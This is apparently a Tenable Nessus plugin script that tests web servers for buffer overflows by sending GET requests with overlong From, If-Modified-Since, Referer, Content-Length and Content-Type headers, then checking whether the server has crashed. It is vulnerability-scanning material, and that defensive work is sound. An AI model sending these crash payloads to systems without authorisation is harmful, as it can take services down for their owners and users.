#
# (C) Tenable Network Security, Inc.
#

# Cf. RFC 1945
#
# Other references:
#
# From: "at4r" <at4r@hotmail.com>
# Subject: IIS Vulnerability Content-Type overflow
# To: <vuln-dev@securityfocus.com>
# Date: Mon, 2 Dec 2002 23:31:27 +0100
# Reply-To: "at4r" <at4r@3wdesign.es>
#
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# Subject: Multiple pServ Remote Buffer Overflow Vulnerabilities
# To: "BugTraq" <bugtraq@securityfocus.com>
# Date: Sun, 1 Dec 2002 12:15:52 -0600
#

include("compat.inc");

if (description)
{
 script_id(11127);
 script_version("$Revision: 1.31 $");
 script_cvs_date("$Date: 2014/05/27 00:36:24 $");

 script_name(english:"Web Server HTTP 1.0 Header Remote Overflow");
 script_summary(english:"Too long HTTP 1.0 header kills the web server");

 script_set_attribute(attribute:"synopsis", value:"Arbitrary code may be run on the remote server.");
 script_set_attribute(attribute:"description", value:
"It was possible to kill the web server by sending an invalid request
with a too long HTTP 1.0 header (From, If-Modified-Since, Referer or
Content-Type).

This vulnerability could be exploited to crash the web server. It
might even be possible to execute arbitrary code on your system.

** As this is a generic test, it is not possible to know if the impact
** is limited to a denial of service.");
 script_set_attribute(attribute:"solution", value:"Upgrade your web server or protect it with a filtering reverse proxy");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_set_attribute(attribute:"plugin_publication_date", value:"2002/09/21");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
# All the www_too_long_*.nasl scripts were first declared as
# ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
# The web server might be killed by those generic tests before Nessus
# has a chance to perform known attacks for which a patch exists
# As ACT_DENIAL are performed one at a time (not in parallel), this reduces
# the risk of false positives.
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("httpver.nasl", "http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

function send_request_or_whine(port, rq, buf)
{
 local_var r;

 if (isnull(rq))
   r = http_send_recv_buf(port: port, data: buf);
 else
  r = http_send_recv_req( port: port, req: rq);
# We do not have to force "version" to 10
 if (! isnull(r)) return;
 if (http_is_dead(port: port, retry: 3)) # Try to avoid FP
   security_hole(port);
 # Could not send request => network glitch?
 exit(0);
}

port = get_http_port(default:80, embedded: 1);

if (! get_port_state(port)) exit(0);
if (http_is_dead(port: port)) exit(0);

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array("From", crap(1024)+"@"+crap(1024)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array( "If-Modified-Since",
   			    "Sat, 29 Oct 1994 19:43:31 "+crap(data: "GMT", length: 1024) ) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array( "Referer",
   			    "http://"+crap(4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array( "Referer",
   			    "http://"+get_host_name()+"/"+crap(4096)) );
send_request_or_whine(port: port, rq: rq);

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array( "Content-length", crap(4096, data: "123456789") ));
send_request_or_whine(port: port, rq: rq);

# Note that the message on VULN-DEV did not say that it was possible to
# *crash* IIS. I put it here just in case...

rq = http_mk_get_req( port: port, item: '/',
   add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded",
   			    "Content-Length", "56",
			    "Accept-Language", "en") );
# Content-Type appears twice, we have to edit the buffer.
buf = http_mk_buffer_from_req(req: rq);
buf -= '\r\n\r\n';
buf = strcat(buf, 'Content-Type:', crap(32769), '\r\n\r\n');
send_request_or_whine(port: port, buf: buf);

if (http_is_dead(port: port, retry: 3)) {  security_hole(port); exit(0); }
